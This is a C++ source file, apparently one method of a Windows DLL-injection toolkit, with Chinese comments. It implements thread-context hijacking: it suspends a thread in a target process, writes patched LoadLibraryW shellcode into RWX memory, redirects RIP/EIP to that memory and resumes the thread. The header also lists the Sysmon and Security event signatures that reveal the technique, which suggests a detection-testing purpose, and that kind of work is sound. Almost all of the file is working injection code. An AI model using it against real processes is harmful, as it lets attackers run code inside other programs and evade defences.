// ════════════════════════════════════════════════════════════════
//  方法 4: 线程上下文注入 — 劫持已有线程执行 shellcode
//
//  原理：
//    1. 挂起目标进程的某个线程
//    2. 在目标进程分配 RWX 内存，写入 shellcode
//    3. shellcode 内容：LoadLibraryW(dllPath) → ExitThread(0)
//    4. GetThreadContext 保存原始 RIP/EIP
//    5. 修改 Context.RIP/EIP 指向 shellcode
//    6. SetThreadContext + ResumeThread 恢复执行
//
//  检测特征：
//    - Sysmon Event 10: OpenProcess(THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT)
//    - Security 4656:   THREAD_SUSPEND_RESUME + THREAD_SET_CONTEXT 同时出现 → 极高危
//    - VirtualQueryEx:  MEM_PRIVATE + PAGE_EXECUTE_READ 新增页 → Manual Map 特征
//    - Sysmon Event 7:  shellcode 中的 LoadLibraryW 调用触发 ImageLoad
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include "../shellcode.h"
#include <tlhelp32.h>

bool Inject_ThreadContext(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 线程上下文注入 → PID=%lu\n", pid);

    // ── 1. 找目标进程的一个线程 ──
    DWORD tid = 0;
    {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;
        THREADENTRY32 te{ .dwSize = sizeof(te) };
        if (Thread32First(snap, &te))
        {
            do {
                if (te.th32OwnerProcessID == pid)
                {
                    tid = te.th32ThreadID;
                    break;
                }
            } while (Thread32Next(snap, &te));
        }
        CloseHandle(snap);
    }
    if (tid == 0)
    {
        Print(L"  [!] 找不到目标线程\n");
        return false;
    }
    Print(L"  [+] 目标线程 TID=%lu\n", tid);

    // ── 2. 打开进程和线程 ──
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProc) { Print(L"  [!] OpenProcess 失败: %lu\n", GetLastError()); return false; }

    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE, tid);
    if (!hThread)
    {
        Print(L"  [!] OpenThread 失败: %lu\n", GetLastError());
        CloseHandle(hProc);
        return false;
    }

    // ── 3. 挂起线程 ──
    if (SuspendThread(hThread) == (DWORD)-1)
    {
        Print(L"  [!] SuspendThread 失败: %lu\n", GetLastError());
        CloseHandle(hThread); CloseHandle(hProc);
        return false;
    }
    Print(L"  [+] 线程已挂起\n");

    // ── 4. 构造 shellcode ──
    size_t dllPathBytes = (wcslen(dllPath) + 1) * sizeof(wchar_t);

#ifdef _WIN64
    constexpr auto& tmpl       = SHELLCODE_TEMPLATE_X64;
    constexpr int  codeSize    = SHELLCODE_CODE_SIZE_X64;
    constexpr int  loadLibOff  = SHELLCODE_LOADLIB_OFF_X64;
    constexpr int  exitCodeOff = SHELLCODE_EXITCODE_OFF_X64;
    constexpr int  stringOff   = SHELLCODE_STRING_OFF_X64;
    constexpr int  ptrSize     = 8;
#else
    constexpr auto& tmpl       = SHELLCODE_TEMPLATE_X86;
    constexpr int  codeSize    = SHELLCODE_CODE_SIZE_X86;
    constexpr int  loadLibOff  = SHELLCODE_LOADLIB_OFF_X86;
    constexpr int  exitCodeOff = SHELLCODE_EXITCODE_OFF_X86;
    constexpr int  stringOff   = SHELLCODE_STRING_OFF_X86;
    constexpr int  ptrSize     = 4;
#endif

    size_t totalSize = stringOff + dllPathBytes;
    // 对齐到 16 字节
    totalSize = (totalSize + 15) & ~15;

    std::vector<uint8_t> shellcode(totalSize, 0);
    memcpy(shellcode.data(), tmpl, sizeof(tmpl));

    // patch LoadLibraryW 地址
    LPVOID pLoadLib = GetLoadLibraryAddr();
    memcpy(shellcode.data() + loadLibOff, &pLoadLib, ptrSize);

    // patch ExitThread(0) 代码块中的 RtlExitUserThread 地址
    LPVOID pExitThread = GetExitThreadAddr();
    memcpy(shellcode.data() + exitCodeOff + ptrSize + 3, &pExitThread, ptrSize);

    // 写入 DLL 路径
    memcpy(shellcode.data() + stringOff, dllPath, dllPathBytes);

    Print(L"  [+] Shellcode 大小: %zu bytes\n", totalSize);
    Print(L"      LoadLibraryW @ %p\n", pLoadLib);
    Print(L"      RtlExitUserThread @ %p\n", pExitThread);

    // ── 5. 在目标进程分配 RWX 内存并写入 shellcode ──
    LPVOID remoteCode = VirtualAllocEx(hProc, nullptr, totalSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteCode)
    {
        Print(L"  [!] VirtualAllocEx 失败: %lu\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread); CloseHandle(hProc);
        return false;
    }

    if (!WriteProcessMemory(hProc, remoteCode, shellcode.data(), totalSize, nullptr))
    {
        Print(L"  [!] WriteProcessMemory 失败: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remoteCode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread); CloseHandle(hProc);
        return false;
    }
    Print(L"  [+] Shellcode 已写入 @ %p\n", remoteCode);

    // ── 6. 修改线程上下文 ──
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx))
    {
        Print(L"  [!] GetThreadContext 失败: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remoteCode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread); CloseHandle(hProc);
        return false;
    }

#ifdef _WIN64
    Print(L"  [+] 原始 RIP = %llX\n", ctx.Rip);
    ctx.Rip = (DWORD64)remoteCode;
    Print(L"  [+] 修改 RIP → %llX\n", ctx.Rip);
#else
    Print(L"  [+] 原始 EIP = %X\n", ctx.Eip);
    ctx.Eip = (DWORD)remoteCode;
    Print(L"  [+] 修改 EIP → %X\n", ctx.Eip);
#endif

    if (!SetThreadContext(hThread, &ctx))
    {
        Print(L"  [!] SetThreadContext 失败: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remoteCode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread); CloseHandle(hProc);
        return false;
    }

    // ── 7. 恢复线程执行 ──
    ResumeThread(hThread);
    Print(L"  [+] 线程已恢复执行\n");

    // 等待 shellcode 执行
    Sleep(1000);

    // 清理（shellcode 已调用 ExitThread，线程已退出）
    VirtualFreeEx(hProc, remoteCode, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);

    Print(L"  [✓] 注入完成\n");
    return true;
}
